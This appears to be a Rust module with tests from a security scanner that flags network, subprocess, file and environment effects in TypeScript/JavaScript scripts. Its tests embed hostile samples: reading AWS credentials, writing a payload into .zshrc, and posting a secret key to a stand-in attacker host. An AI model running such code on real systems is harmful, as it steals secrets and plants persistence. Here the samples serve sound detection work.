//! Lexical TypeScript / JavaScript host-effect extraction.
//!
//! Covers server-side TS/JS run by Deno, Bun, or Node (via tsx/ts-node), where
//! code has real host effects. It does not try to tell browser code from server
//! code; it matches only **host-effect APIs**, and browser component code -
//! React, DOM - simply does not call them, so the same extractor is quiet on a
//! `.tsx` component and loud on a `Deno.Command` script.
//!
//! The API surface across the three runtimes is small and regular, which is
//! what makes lexical extraction sufficient here as it is for shell and Python.
//! An argument that is a variable rather than a literal yields an unresolved
//! effect, exactly as elsewhere.
//!
//! `fetch` is the one genuinely ambiguous call - it exists in the browser too.
//! It is treated as a host request only in a script file or a server-labeled
//! fence, never in a `.tsx`/`.jsx` component. The caller decides that by which
//! files it routes here.

use super::pyargs::{find_call, first_argument, Argument};
use crate::effect::{
    Confidence, EffectClass, EffectEvidence, EffectObservation, EffectOrigin, EffectTarget,
    PathClass, Reach, TargetResolution,
};
use crate::normalize::{path, url};

/// A recognized call and the effect it implies.
struct Call {
    name: &'static str,
    kind: CallKind,
}

#[derive(Clone, Copy)]
enum CallKind {
    Fetch,
    Egress,
    Exec,
    FileRead,
    FileWrite,
    EnvGet,
}

/// Host-effect calls across Deno, Bun, and Node. Namespaced forms only, so
/// `regex.exec(...)` and a user's own `spawn(...)` do not match by accident.
const CALLS: &[Call] = &[
    // Network.
    Call {
        name: "fetch",
        kind: CallKind::Fetch,
    },
    Call {
        name: "axios.get",
        kind: CallKind::Fetch,
    },
    Call {
        name: "axios.post",
        kind: CallKind::Egress,
    },
    Call {
        name: "axios.put",
        kind: CallKind::Egress,
    },
    Call {
        name: "https.request",
        kind: CallKind::Egress,
    },
    Call {
        name: "https.get",
        kind: CallKind::Fetch,
    },
    Call {
        name: "http.request",
        kind: CallKind::Egress,
    },
    Call {
        name: "Deno.connect",
        kind: CallKind::Egress,
    },
    Call {
        name: "Bun.connect",
        kind: CallKind::Egress,
    },
    // Subprocess.
    Call {
        name: "Deno.Command",
        kind: CallKind::Exec,
    },
    Call {
        name: "Deno.run",
        kind: CallKind::Exec,
    },
    Call {
        name: "Bun.spawn",
        kind: CallKind::Exec,
    },
    Call {
        name: "Bun.spawnSync",
        kind: CallKind::Exec,
    },
    Call {
        name: "child_process.exec",
        kind: CallKind::Exec,
    },
    Call {
        name: "child_process.execSync",
        kind: CallKind::Exec,
    },
    Call {
        name: "child_process.spawn",
        kind: CallKind::Exec,
    },
    Call {
        name: "child_process.spawnSync",
        kind: CallKind::Exec,
    },
    Call {
        name: "execSync",
        kind: CallKind::Exec,
    },
    Call {
        name: "spawnSync",
        kind: CallKind::Exec,
    },
    // Files.
    Call {
        name: "Deno.readTextFile",
        kind: CallKind::FileRead,
    },
    Call {
        name: "Deno.readFile",
        kind: CallKind::FileRead,
    },
    Call {
        name: "Deno.writeTextFile",
        kind: CallKind::FileWrite,
    },
    Call {
        name: "Deno.writeFile",
        kind: CallKind::FileWrite,
    },
    Call {
        name: "Bun.file",
        kind: CallKind::FileRead,
    },
    Call {
        name: "Bun.write",
        kind: CallKind::FileWrite,
    },
    Call {
        name: "fs.readFileSync",
        kind: CallKind::FileRead,
    },
    Call {
        name: "fs.readFile",
        kind: CallKind::FileRead,
    },
    Call {
        name: "fs.writeFileSync",
        kind: CallKind::FileWrite,
    },
    Call {
        name: "fs.writeFile",
        kind: CallKind::FileWrite,
    },
    Call {
        name: "fs.appendFileSync",
        kind: CallKind::FileWrite,
    },
    Call {
        name: "fs.appendFile",
        kind: CallKind::FileWrite,
    },
    Call {
        name: "readFileSync",
        kind: CallKind::FileRead,
    },
    Call {
        name: "writeFileSync",
        kind: CallKind::FileWrite,
    },
    // Environment by name.
    Call {
        name: "Deno.env.get",
        kind: CallKind::EnvGet,
    },
];

/// Where a chunk of TS/JS came from.
#[derive(Clone, Copy, Debug)]
pub struct TsJsContext<'a> {
    pub path: &'a str,
    pub origin: EffectOrigin,
    pub reach: Reach,
    pub first_line: usize,
}

/// Extract every host effect a chunk of TS/JS would cause.
pub fn extract(text: &str, context: TsJsContext<'_>) -> Vec<EffectObservation> {
    let mut out = Vec::new();
    for (offset, raw_line) in text.lines().enumerate() {
        let line = strip_line_comment(raw_line);
        if line.trim().is_empty() {
            continue;
        }
        let line_number = context.first_line + offset;
        extract_line(line, line_number, context, &mut out);
    }
    out
}

fn extract_line(
    line: &str,
    line_number: usize,
    context: TsJsContext<'_>,
    out: &mut Vec<EffectObservation>,
) {
    let evidence = || EffectEvidence::new(context.path, Some(line_number), line.trim());

    for call in CALLS {
        if let Some(paren) = find_call(line, call.name) {
            // `fetch` is both an outbound call and, in server frameworks, a
            // request-handler name and an internal dispatch method. Only treat
            // it as network when it is the global function called with a URL.
            if call.name == "fetch" && !is_outbound_fetch(line, paren) {
                continue;
            }
            let argument = first_argument(line, paren);
            emit(call.kind, argument, line, paren, context, &evidence(), out);
        }
    }
    emit_process_env(line, context, &evidence(), out);
}

#[allow(clippy::too_many_arguments)]
fn emit(
    kind: CallKind,
    argument: Option<Argument>,
    line: &str,
    paren: usize,
    context: TsJsContext<'_>,
    evidence: &EffectEvidence,
    out: &mut Vec<EffectObservation>,
) {
    match kind {
        CallKind::Fetch | CallKind::Egress => {
            emit_network(kind, argument, line, paren, context, evidence, out)
        }
        CallKind::Exec => emit_exec(argument, context, evidence, out),
        CallKind::FileRead => emit_file(argument, false, context, evidence, out),
        CallKind::FileWrite => emit_file(argument, true, context, evidence, out),
        CallKind::EnvGet => {
            if let Some(Argument::Str(var)) = argument {
                emit_env(&var, context, evidence, out);
            }
        }
    }
}

#[allow(clippy::too_many_arguments)]
fn emit_network(
    kind: CallKind,
    argument: Option<Argument>,
    line: &str,
    paren: usize,
    context: TsJsContext<'_>,
    evidence: &EffectEvidence,
    out: &mut Vec<EffectObservation>,
) {
    // A fetch carrying a write method - or an options object at all, which for
    // fetch almost always means a non-GET request with a body - is egress. A
    // bare `fetch(url)` is a plain retrieval. The options-object signal is what
    // makes a multi-line `fetch(url, { method: "POST" })` egress even when the
    // method keyword lands on a later line.
    let class = if matches!(kind, CallKind::Egress)
        || mentions_write_method(line)
        || has_second_argument(line, paren)
    {
        EffectClass::NetEgress
    } else {
        EffectClass::NetFetch
    };
    let (target, resolution) = match argument {
        Some(Argument::Str(raw)) | Some(Argument::ListHead(raw)) => match url::normalize(&raw) {
            Some(normalized) if normalized.host.contains('.') || normalized.host.contains('$') => (
                EffectTarget::Host {
                    host: normalized.host,
                    scheme: normalized.scheme,
                    port: normalized.port,
                    ip_literal: normalized.ip_literal,
                    non_ascii: normalized.non_ascii,
                },
                normalized.resolution,
            ),
            _ => (unknown_host(), TargetResolution::Unknown),
        },
        _ => (unknown_host(), TargetResolution::Unknown),
    };
    out.push(EffectObservation {
        class,
        target,
        resolution,
        origin: context.origin,
        reach: context.reach,
        confidence: Confidence::High,
        evidence: evidence.clone(),
    });
}

fn emit_exec(
    argument: Option<Argument>,
    context: TsJsContext<'_>,
    evidence: &EffectEvidence,
    out: &mut Vec<EffectObservation>,
) {
    let (target, resolution) = match argument {
        Some(Argument::ListHead(name)) | Some(Argument::Str(name)) => {
            let basename = name
                .split_whitespace()
                .next()
                .unwrap_or(&name)
                .rsplit(['/', '\\'])
                .next()
                .unwrap_or(&name)
                .to_ascii_lowercase();
            let resolution = if name.contains('$') || name.contains('{') {
                TargetResolution::Dynamic
            } else {
                TargetResolution::Literal
            };
            (
                EffectTarget::Binary {
                    name: basename,
                    privileged: false,
                },
                resolution,
            )
        }
        _ => (
            EffectTarget::Binary {
                name: "unknown".to_owned(),
                privileged: false,
            },
            TargetResolution::Dynamic,
        ),
    };
    out.push(EffectObservation {
        class: EffectClass::ProcExec,
        target,
        resolution,
        origin: context.origin,
        reach: context.reach,
        confidence: Confidence::High,
        evidence: evidence.clone(),
    });
}

fn emit_file(
    argument: Option<Argument>,
    write: bool,
    context: TsJsContext<'_>,
    evidence: &EffectEvidence,
    out: &mut Vec<EffectObservation>,
) {
    let Some(Argument::Str(raw)) = argument else {
        return;
    };
    let normalized = path::normalize(&raw);
    out.push(EffectObservation {
        class: if write {
            write_class(normalized.class)
        } else {
            EffectClass::FsRead
        },
        target: EffectTarget::Path {
            pattern: normalized.pattern,
            class: normalized.class,
        },
        resolution: normalized.resolution,
        origin: context.origin,
        reach: context.reach,
        confidence: Confidence::Medium,
        evidence: evidence.clone(),
    });
}

fn emit_env(
    var: &str,
    context: TsJsContext<'_>,
    evidence: &EffectEvidence,
    out: &mut Vec<EffectObservation>,
) {
    out.push(EffectObservation {
        class: EffectClass::EnvRead,
        target: EffectTarget::EnvVar {
            name: var.to_owned(),
            credential_like: crate::normalize::env::is_credential_like(var),
        },
        resolution: TargetResolution::Literal,
        origin: context.origin,
        reach: context.reach,
        confidence: Confidence::High,
        evidence: evidence.clone(),
    });
}

/// `process.env.NAME`, `process.env['NAME']`, and `Bun.env.NAME`.
fn emit_process_env(
    line: &str,
    context: TsJsContext<'_>,
    evidence: &EffectEvidence,
    out: &mut Vec<EffectObservation>,
) {
    for prefix in ["process.env", "Bun.env"] {
        let mut from = 0;
        while let Some(rel) = line[from..].find(prefix) {
            let start = from + rel + prefix.len();
            from = start;
            let rest = &line[start..];
            let var = if let Some(inner) = rest.strip_prefix('.') {
                inner
                    .chars()
                    .take_while(|ch| ch.is_ascii_alphanumeric() || *ch == '_')
                    .collect::<String>()
            } else if let Some(inner) = rest.strip_prefix('[') {
                inner
                    .trim_start_matches(['"', '\'', '`'])
                    .chars()
                    .take_while(|ch| ch.is_ascii_alphanumeric() || *ch == '_')
                    .collect::<String>()
            } else {
                String::new()
            };
            if !var.is_empty() {
                emit_env(&var, context, evidence, out);
            }
        }
    }
}

/// Whether a `fetch(` at `paren` is an outbound network call rather than a
/// handler definition or an internal dispatch.
///
/// Excludes `.fetch(` (a method on an object, e.g. a Cloudflare Worker's
/// `app.fetch(request)`), `override`/`async`/`function` definitions of a
/// `fetch` method, and a first argument that is a request-shaped identifier.
/// A URL string, a template literal, or an ordinary variable still counts.
fn is_outbound_fetch(line: &str, paren: usize) -> bool {
    let before = line[..paren].trim_end();
    // The token immediately before `fetch` - method access or a definition
    // keyword - disqualifies it.
    let head = before.trim_end_matches("fetch").trim_end();
    if head.ends_with('.') {
        return false;
    }
    if let Some(word) = head.rsplit([' ', '\t']).next() {
        if matches!(
            word,
            "override" | "async" | "function" | "def" | "public" | "private"
        ) {
            return false;
        }
    }
    // A request-object first argument indicates a handler or dispatch.
    let arg = line[paren + 1..]
        .split([',', ')'])
        .next()
        .unwrap_or_default()
        .trim();
    let arg_name = arg.split([':', ' ']).next().unwrap_or_default();
    !matches!(arg_name, "request" | "req" | "ctx" | "event" | "e")
}

/// Whether the call opened at `paren` has a second positional argument on this
/// line - a comma at the top bracket level before the call closes.
fn has_second_argument(line: &str, paren: usize) -> bool {
    let bytes = line.as_bytes();
    let mut depth = 0i32;
    let mut quote: Option<u8> = None;
    let mut index = paren + 1;
    while index < bytes.len() {
        let byte = bytes[index];
        match quote {
            Some(q) => {
                if byte == b'\\' {
                    index += 2;
                    continue;
                }
                if byte == q {
                    quote = None;
                }
            }
            None => match byte {
                b'\'' | b'"' | b'`' => quote = Some(byte),
                b'(' | b'[' | b'{' => depth += 1,
                b')' if depth == 0 => return false,
                b')' | b']' | b'}' => depth -= 1,
                b',' if depth == 0 => return true,
                _ => {}
            },
        }
        index += 1;
    }
    // The call's argument list runs off the end of the line, so an options
    // object continues below: treat that as a second argument.
    true
}

fn mentions_write_method(line: &str) -> bool {
    let upper = line.to_ascii_uppercase();
    (upper.contains("METHOD") || upper.contains("\"POST\"") || upper.contains("'POST'"))
        && ["POST", "PUT", "PATCH", "DELETE"]
            .iter()
            .any(|method| upper.contains(method))
}

fn write_class(class: PathClass) -> EffectClass {
    match class {
        PathClass::AgentConfig | PathClass::SkillPackage | PathClass::ShellInit => {
            EffectClass::AgentConfig
        }
        _ => EffectClass::FsWrite,
    }
}

fn unknown_host() -> EffectTarget {
    EffectTarget::Host {
        host: "unknown".to_owned(),
        scheme: None,
        port: None,
        ip_literal: false,
        non_ascii: false,
    }
}

/// Drop a `//` line comment outside a string.
fn strip_line_comment(line: &str) -> &str {
    let bytes = line.as_bytes();
    let mut quote: Option<u8> = None;
    let mut index = 0;
    while index + 1 < bytes.len() {
        match quote {
            Some(q) => {
                if bytes[index] == b'\\' {
                    index += 2;
                    continue;
                }
                if bytes[index] == q {
                    quote = None;
                }
            }
            None => match bytes[index] {
                b'"' | b'\'' | b'`' => quote = Some(bytes[index]),
                b'/' if bytes[index + 1] == b'/' => return &line[..index],
                _ => {}
            },
        }
        index += 1;
    }
    line
}

#[cfg(test)]
mod tests {
    use super::{extract, TsJsContext};
    use crate::effect::{
        EffectClass, EffectObservation, EffectOrigin, EffectTarget, PathClass, Reach,
        TargetResolution,
    };

    fn run(text: &str) -> Vec<EffectObservation> {
        extract(
            text,
            TsJsContext {
                path: "scripts/tool.ts",
                origin: EffectOrigin::ScriptFile,
                reach: Reach::Deferred,
                first_line: 1,
            },
        )
    }

    fn classes(text: &str) -> Vec<EffectClass> {
        let mut classes = run(text).into_iter().map(|o| o.class).collect::<Vec<_>>();
        classes.sort();
        classes.dedup();
        classes
    }

    #[test]
    fn deno_command_records_the_binary() {
        assert!(
            run("const p = new Deno.Command(\"git\", { args: [\"push\"] });")
                .iter()
                .any(|o| matches!(&o.target, EffectTarget::Binary { name, .. } if name == "git"))
        );
    }

    #[test]
    fn bun_spawn_reads_the_binary_from_a_list() {
        assert!(run("Bun.spawn([\"ls\", \"-la\"]);")
            .iter()
            .any(|o| matches!(&o.target, EffectTarget::Binary { name, .. } if name == "ls")));
    }

    #[test]
    fn node_child_process_exec_reads_the_command() {
        assert!(run("child_process.execSync(\"rm -rf build\");")
            .iter()
            .any(|o| matches!(&o.target, EffectTarget::Binary { name, .. } if name == "rm")));
    }

    #[test]
    fn a_variable_command_is_dynamic_execution() {
        let obs = run("Bun.spawn(cmd);");
        let exec = obs
            .iter()
            .find(|o| o.class == EffectClass::ProcExec)
            .unwrap();
        assert_eq!(exec.resolution, TargetResolution::Dynamic);
    }

    #[test]
    fn fetch_is_a_host_request_and_a_post_is_egress() {
        assert!(
            classes("await fetch(\"https://api.example.com/x\")").contains(&EffectClass::NetFetch)
        );
        assert!(
            classes("fetch(\"https://api.example.com/x\", { method: \"POST\", body })")
                .contains(&EffectClass::NetEgress)
        );
        // A multi-line fetch whose options object opens on the call line is
        // egress even though the method keyword is on a later line.
        assert!(classes("fetch(\"https://api.example.com/x\", {").contains(&EffectClass::NetEgress));
    }

    #[test]
    fn a_fetch_handler_definition_is_not_an_outbound_call() {
        // Cloudflare/Hono style: defining or dispatching, not calling out.
        assert!(run("override fetch(request: Request): Promise<Response> {").is_empty());
        assert!(run("return this.#app.fetch(request, {}, this.ctx);").is_empty());
        assert!(run("const res = app.fetch(req);").is_empty());
    }

    #[test]
    fn an_outbound_fetch_to_a_url_is_still_network() {
        assert!(
            classes("await fetch(\"https://api.example.com/x\")").contains(&EffectClass::NetFetch)
        );
        assert!(classes("const r = fetch(endpoint)").contains(&EffectClass::NetFetch));
    }

    #[test]
    fn a_template_literal_url_is_read() {
        let obs = run("fetch(`https://api.example.com/${id}`)");
        assert!(obs.iter().any(
            |o| matches!(&o.target, EffectTarget::Host { host, .. } if host == "api.example.com")
        ));
    }

    #[test]
    fn a_variable_url_is_recorded_unresolved() {
        let obs = run("fetch(endpoint)");
        let net = obs
            .iter()
            .find(|o| o.class == EffectClass::NetFetch)
            .unwrap();
        assert_eq!(net.resolution, TargetResolution::Unknown);
    }

    #[test]
    fn deno_file_apis_distinguish_read_from_write() {
        assert!(classes("await Deno.readTextFile(\"data/in.json\")").contains(&EffectClass::FsRead));
        assert!(
            classes("await Deno.writeTextFile(\"out/x.json\", s)").contains(&EffectClass::FsWrite)
        );
    }

    #[test]
    fn a_secret_file_read_surfaces_its_class() {
        let obs = run("const k = Deno.readTextFile(\"/root/.aws/credentials\")");
        assert!(obs
            .iter()
            .any(|o| o.target.path_class() == Some(PathClass::Secret)));
    }

    #[test]
    fn writing_shell_init_is_agent_config() {
        assert!(classes("fs.writeFileSync(\"/root/.zshrc\", payload)")
            .contains(&EffectClass::AgentConfig));
    }

    #[test]
    fn deno_env_get_and_process_env_are_both_read() {
        assert!(run("const t = Deno.env.get(\"GITHUB_TOKEN\")").iter().any(
            |o| matches!(&o.target, EffectTarget::EnvVar { name, credential_like }
                if name == "GITHUB_TOKEN" && *credential_like)
        ));
        assert!(run("const t = process.env.AWS_SECRET_ACCESS_KEY")
            .iter()
            .any(|o| matches!(&o.target, EffectTarget::EnvVar { credential_like, .. } if *credential_like)));
        assert!(run("const t = process.env['NPM_TOKEN']").iter().any(
            |o| matches!(&o.target, EffectTarget::EnvVar { name, .. } if name == "NPM_TOKEN")
        ));
    }

    #[test]
    fn browser_component_code_produces_no_host_effects() {
        // The same extractor is quiet on DOM/React because none of it calls a
        // host-effect API. No browser/server heuristic is needed.
        let component = "export function App() {\n  const [x, setX] = useState(0);\n  return <button onClick={() => setX(x + 1)}>{x}</button>;\n}";
        assert!(run(component).is_empty());
    }

    #[test]
    fn a_regex_exec_is_not_a_subprocess() {
        // `.exec(` on a regex must not match; only namespaced exec forms do.
        assert!(run("const m = /foo/.exec(input);").is_empty());
    }

    #[test]
    fn line_comments_are_ignored() {
        assert!(run("// Deno.Command(\"rm\")").is_empty());
    }

    #[test]
    fn the_exfiltration_shape_is_recorded_across_two_calls() {
        let text = "const key = Deno.env.get(\"AWS_SECRET_ACCESS_KEY\");\nawait fetch(\"https://evil.example.net/x\", { method: \"POST\", body: key });";
        let classes = classes(text);
        assert!(classes.contains(&EffectClass::EnvRead));
        assert!(classes.contains(&EffectClass::NetEgress));
    }
}
